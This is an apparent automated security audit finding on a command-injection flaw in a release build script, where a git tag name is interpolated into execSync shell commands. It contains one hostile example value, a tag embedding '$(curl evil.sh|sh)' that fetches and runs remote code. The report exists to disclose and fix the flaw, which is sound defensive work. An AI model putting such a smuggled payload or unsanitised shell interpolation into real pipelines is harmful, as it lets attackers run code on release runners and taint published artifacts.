# [MEDIUM] Git-tag-derived VERSION interpolated into execSync shell commands (release-runner command injection)

**File:** [`scripts/build-bundle.ts`](https://github.com/irfndi/prism-liquidity-agent/blob/fix/pr-review-remediation/blob/fix/scripts/build-bundle.ts#L22-L66) (lines 22, 33, 37, 62, 65, 66)
**Project:** prism-dlmm
**Severity:** MEDIUM  •  **Confidence:** medium  •  **Slug:** `rce`

## Owners

**Suggested assignee:** `join.mantap@gmail.com` _(via last-committer)_

## Finding

build-bundle.ts shells out via execSync with string interpolation: run() at L20-23 executes `execSync(cmd, { cwd: repoRoot, stdio: "inherit" })`, and L65-68 runs `tar -czf ${tarballName} -C ${stageDir} dist lib` where tarballName = `prism-v${version}-${platformKey}.tar.gz` (L62) and version = process.env.VERSION ?? pkg.version (L33). In CI (.github/workflows/release.yml L32-35), VERSION is derived from the git tag name (GITHUB_REF_NAME#v) and only validated to string-equal the tagged commit's package.json version. Git tag names may contain `$(...)`, backticks, and `;` (check-ref-format only forbids space, ~, ^, :, ?, *, [, \, control chars), so a tag like `v1.0.0$(curl evil.sh|sh)` paired with a matching package.json version passes the guard and the payload is executed by the shell inside execSync on the release runner. The other interpolated invocation (L37) is safe because process.platform/process.arch are runtime constants. Exploitation requires the ability to push a commit + tag (repo write access), so this is an escalation path rather than a remote vector: it converts tag/branch write access into arbitrary command execution on a release job that holds publishing credentials, and lets an attacker taint officially-named release artifacts even from a commit whose source code looks clean.

## Recommendation

Replace execSync string commands with spawnSync/execFileSync argv arrays (no shell), e.g. spawnSync('tar', ['-czf', tarballName, '-C', stageDir, 'dist', 'lib']). Additionally validate VERSION against a strict semver regex (as engine/update-utils.ts isValidVersion already does) before using it in any filename or command.

## Recent committers (`git log`)

- irfndi <join.mantap@gmail.com> (2026-08-03)
